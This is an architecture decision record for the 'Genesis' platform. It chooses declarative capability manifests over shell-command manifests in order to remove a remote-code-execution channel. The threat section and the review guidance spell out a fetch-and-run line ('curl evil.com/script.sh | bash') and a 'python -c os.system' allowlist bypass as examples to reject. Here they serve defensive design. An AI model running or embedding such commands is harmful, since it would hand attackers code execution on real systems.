# ADR 001: Declarative Capability DNA

**Status**: Accepted  
**Date**: 2026-09-23  
**Decision Makers**: Architecture Review  
**Supersedes**: None  
**Superseded By**: None

---

## Context

Genesis capabilities need a manifest format that describes what a capability is, what it requires, and what permissions it needs.

Two fundamental approaches were considered:

1. **Imperative**: Manifests contain executable commands
2. **Declarative**: Manifests describe resources and constraints

### The Problem

If capabilities are manifests with shell commands:
```yaml
# IMPERATIVE APPROACH (rejected)
lifecycle:
  build: "pip install -r requirements.txt"
  test: "pytest tests/"
  run: "python main.py"
```

Eventually, Genesis will generate capabilities autonomously. A generated capability could declare:
```yaml
run: "curl evil.com/script.sh | bash"
```

And the Genesis runtime would **interpret the manifest as executable instructions**, creating an implicit remote code execution interface.

**This contradicts the core security principle**: Capability manifests should not be executable programs.

---

## Decision

**Capability DNA must be declarative.**

Manifests describe **WHAT a capability needs**, not **HOW to execute it**.

### Approved Format

```yaml
# DECLARATIVE APPROACH (approved)
runtime:
  type: python
  entrypoint: hello_capability.main:greet

requirements:
  python: ">=3.11"

permissions:
  filesystem:
    read: false
    write: false
  network:
    outbound: false
  process:
    spawn: false
```

### Execution Model

```
Capability DNA (declarative specification)
  ↓
Trusted ExecutionBackend (interprets runtime spec)
  ↓
Controlled execution
```

**NOT**:
```
Capability DNA (shell commands)
  ↓
Direct OS execution
```

---

## Consequences

### Positive

1. **Security**: No RCE vulnerability through manifests
2. **Future-Proof**: Safe for AI-generated capabilities
3. **Validation**: Manifest structure is machine-validatable
4. **Portability**: Same manifest can work with different ExecutionBackends
5. **Clarity**: Clear separation between specification and execution

### Negative

1. **Flexibility**: Cannot express arbitrary execution logic in manifests
2. **Learning Curve**: Users familiar with Docker/CI systems expect shell commands
3. **Implementation**: Requires building ExecutionBackend interpreters

### Neutral

1. **Verbosity**: Declarative specs can be more verbose than shell commands
2. **Abstraction**: Adds a layer between spec and execution

---

## Alternatives Considered

### Alternative 1: Imperative Shell Commands

**Format**:
```yaml
lifecycle:
  build: "pip install -r requirements.txt"
  test: "pytest tests/"
  run: "python main.py"
```

**Advantages**:
- Familiar to users
- Flexible
- Simple to implement initially

**Disadvantages**:
- **Critical Security Risk**: RCE vulnerability
- Unsafe for AI-generated capabilities
- Hard to validate
- Platform-dependent

**Verdict**: **Rejected** due to security risk.

### Alternative 2: Restricted Shell DSL

**Format**:
```yaml
lifecycle:
  run:
    command: python
    args: [main.py]
    allowed_executables: [python, pytest]
```

**Advantages**:
- Some flexibility
- More restrictive than raw shell

**Disadvantages**:
- Still allows execution logic in manifests
- Complex allowlist management
- Can be bypassed (e.g., `python -c "import os; os.system(...)"`)

**Verdict**: **Rejected** - security improvement insufficient.

### Alternative 3: Declarative with Extension Points

**Format**:
```yaml
runtime:
  type: python
  entrypoint: main:run

extensions:
  custom_lifecycle:
    plugin: my_plugin
    config: {...}
```

**Advantages**:
- Declarative core
- Extensible for advanced use cases

**Disadvantages**:
- Complexity
- Plugin security becomes a problem
- Not needed for v0.1

**Verdict**: **Deferred** - potential future extension.

---

## Implementation Notes

### Entrypoint Format

**Approved**: `<module>:<function>` or `<module>:<class>.<method>`

**Examples**:
- `hello.main:greet`
- `aws_auditor.analyzer:SecurityAnalyzer.run`

**NOT Allowed**:
- `python main.py` (shell command)
- `./run.sh` (shell script)

### Runtime Types

**v0.1**: Only `python` supported.

**Future**:
- `node`
- `binary` (compiled executables with specified interface)
- `container` (OCI container spec)

### ExecutionBackend Responsibilities

The ExecutionBackend interprets the declarative spec:

```python
class SubprocessBackend(ExecutionBackend):
    def execute(self, artifact: CapabilityArtifact) -> ExecutionResult:
        # Read artifact.capability_dna.runtime
        # Interpret runtime.type and runtime.entrypoint
        # Spawn process with controlled environment
        # Return results
```

**Key Point**: ExecutionBackend is **trusted infrastructure**. It controls how manifests are interpreted and executed.

---

## Validation

### Schema Enforcement

JSON Schema validates:
- `runtime.type` is enum of allowed types
- `runtime.entrypoint` matches pattern: `^[a-zA-Z0-9_.]+:[a-zA-Z0-9_.]+$`
- No `lifecycle.build`, `lifecycle.run`, etc. fields

### Code Review Guidance

When reviewing capability DNA:

✅ **Acceptable**:
```yaml
runtime:
  type: python
  entrypoint: module.submodule:function_name
```

❌ **Reject Immediately**:
```yaml
runtime:
  command: "curl ... | bash"
```
```yaml
lifecycle:
  run: "python -c 'import os; os.system(...)'"
```

---

## Migration Path

### For Existing Capabilities (Future)

If Genesis later needs to support existing capability systems with imperative manifests:

**Option 1**: Wrapper backend
```python
class LegacyWrapperBackend(ExecutionBackend):
    """Wraps legacy shell-based capabilities with security controls."""
    # Strict allowlist, sandboxing, human approval
```

**Option 2**: Migration tool
```bash
genesis migrate legacy-capability.yaml --to declarative
```

**Option 3**: Explicit legacy mode
```yaml
apiVersion: genesis.cognitiveos.dev/v1alpha1-legacy
kind: LegacyCapability  # Different kind
spec:
  legacy:
    shell_command: "..."  # Explicitly marked as legacy
  security:
    requires_extra_approval: true
```

**Decision**: Defer until/if needed.

---

## Security Implications

### Threat Model

**Without This Decision** (imperative manifests):
- ✅ Simple to implement
- ❌ RCE vulnerability
- ❌ Unsafe for AI generation
- ❌ Difficult to validate

**With This Decision** (declarative manifests):
- ✅ No RCE through manifests
- ✅ Safe for AI generation
- ✅ Validatable structure
- ✅ Clear execution control

### Attack Surface

**Eliminated**:
- Shell injection in manifests
- Arbitrary command execution from untrusted manifests

**Moved To**:
- ExecutionBackend implementation (trusted infrastructure)
- Capability implementation code (subject to approval)

**Net Security Impact**: **Significant improvement**

---

## Future Considerations

### v0.4+: Advanced Runtime Specs

Future capability types may need:
- Init containers
- Sidecar processes
- Multi-stage execution

**Extension Path**:
```yaml
runtime:
  type: python
  entrypoint: main:run
  
  advanced:
    init:
      - type: python
        entrypoint: setup:initialize
    sidecars:
      - name: cache
        type: redis
        config: {...}
```

**Still declarative** - describes infrastructure, not shell commands.

### v0.7+: Container-Based Execution

```yaml
runtime:
  type: container
  image: docker.io/myorg/capability:1.0.0
  entrypoint: ["/app/run"]
```

**Declarative container spec** - not `docker run ...` command.

---

## Review and Approval

**Architecture Review Outcome**: ✅ **APPROVED**

**Key Review Comments**:
> "This is the mayor problem I found. Shell commands inside Capability DNA contradicts our security philosophy. Eventually a downloaded capability could declare `run whatever-I-want` and the runtime would interpret the manifest as executable instructions."

**Correction Applied**: Removed all imperative shell commands from proposed manifests. Capability DNA is now 100% declarative.

---

## References

- [Capability DNA Specification](../capability-dna.md)
- [Security Model](../security-model.md)
- [Architecture Proposal](../../ARCHITECTURE_PROPOSAL.md)
- Architecture Review (2026-09-23)

---

## Changelog

- **2026-09-23**: Initial decision
- **2026-09-23**: Approved in architecture review

---

**Decision Owner**: Genesis Architecture Team  
**Implementation Status**: ✅ Implemented in v0.1  
**Review Date**: 2027-03-23 (6 months)
